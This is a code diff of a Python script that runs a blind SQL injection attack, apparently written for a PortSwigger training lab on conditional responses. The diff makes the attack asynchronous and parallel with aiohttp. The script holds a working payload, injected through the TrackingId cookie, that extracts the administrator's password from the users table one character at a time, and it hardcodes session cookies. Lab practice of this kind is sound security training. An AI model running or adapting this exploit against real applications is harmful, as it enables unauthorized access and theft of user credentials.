@@ -18,7 +18,7 @@ password_extracted = {}
 Get the character for a single position.
 Character is saved in the global variable "password_extracted".
 """
-async def getChar(position, url):
+async def getChar(position, url, session):
     for j in range(32, 126):
         #sys.stdout.write("Trying char %s at pos %s\n" % (chr(j), position))
         #sys.stdout.write("password_extracted: %s" % password_extracted)
@@ -26,22 +26,38 @@ async def getChar(position, url):
         sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (position, j)
         sqli_payload_encoded = urllib.parse.quote(sqli_payload)
         cookies = {
-            "TrackingId": "7Rh903HXWXYcVYbT" + sqli_payload_encoded,
-            "session": "n5P2GzbUCXaKRhNMYtHgqJsdpifQOsyk"
+            "TrackingId": "7XS4c5L7eng2VT6o" + sqli_payload_encoded,
+            "session": "V9GFGbfEJ4GpzooL6cVFVCkWNkEWkXrU"
         }
-        r = requests.get(url, cookies=cookies, verify=False)
-        if "Welcome" in r.text:
-            sys.stdout.write(chr(j))
-            sys.stdout.flush()
-            password_extracted[position] = chr(j)
-            return
+        async with session.get(url, cookies=cookies, ssl=False) as r:
+            text = await r.text()
+            if "Welcome" in text:
+                sys.stdout.write("char %s at pos %s\n" % (chr(j), position))
+                sys.stdout.flush()
+                password_extracted[position] = chr(j)
+                return
 
+"""
+Run the tasks to get the individual characters in parallel.
+Using aiohttp as asynchronous http client.
+"""
 async def runParallel(url):
-    rangeNums = list(range(1, 21))
-    tasks = [getChar(i, url) for i in rangeNums]
-    await asyncio.gather(*tasks)
+    async with aiohttp.ClientSession() as session:
+        rangeNums = list(range(1, 21))
+        tasks = [getChar(i, url, session) for i in rangeNums]
+        await asyncio.gather(*tasks)
+
+    password = "".join(
+        password_extracted[i] for i in sorted(password_extracted)
+    )
+    sys.stdout.write("\npassword: %s" % password)
+    sys.stdout.flush()
 
 
+"""
+Old synchronous version of the blind SQL Injection method.
+From Rana Khalil (https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses)
+"""
 def sqli_password(url):
     password_extracted = ""
     for i in range(1, 21):
